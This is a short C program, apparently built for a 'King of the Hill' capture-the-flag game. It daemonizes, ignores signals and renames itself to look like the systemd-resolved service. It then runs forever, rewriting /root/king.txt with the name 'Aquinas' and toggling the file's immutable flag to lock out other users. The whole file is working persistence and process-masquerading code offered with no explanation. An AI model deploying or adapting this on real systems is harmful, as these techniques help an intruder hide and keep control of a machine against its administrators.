#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <linux/fs.h>

#define KING_PATH "/root/king.txt"
#define KING_USERNAME "Aquinas"

static inline void set_title(int argc, char **argv, const char *title) {
    int space = 0;

    for (int i = 0; i < argc; i++)
        space += strlen(argv[i]) + 1;

    memset(argv[0], '\0', space);
    strncpy(argv[0], title, space - 1);
}

static inline void write_file() {
    FILE *fp;

    fp = fopen(KING_PATH, "r");

    // unlock
    int flag = 0;
    ioctl(fileno(fp), FS_IOC_SETFLAGS, &flag);
    fclose(fp);

    chmod(KING_PATH, S_IWUSR | S_IRUSR);

    fp = fopen(KING_PATH, "w");
    fputs(KING_USERNAME, fp);
    fclose(fp);

    fp = fopen(KING_PATH, "r");

    chmod(KING_PATH, S_IRUSR | S_IRGRP | S_IROTH);

    // lock
    flag = 16;
    ioctl(fileno(fp), FS_IOC_SETFLAGS, &flag);

    fclose(fp);
}

int main(int argc, char *argv[]) {
    if (fork() != 0) exit(0);
    setsid();

    for (int i = 0; i < 10; i++)
      signal(i, SIG_IGN);

    set_title(argc, argv, "/lib/systemd/systemd-resolved");

    for (;;) {
        write_file();
        usleep(1000);
    }
}
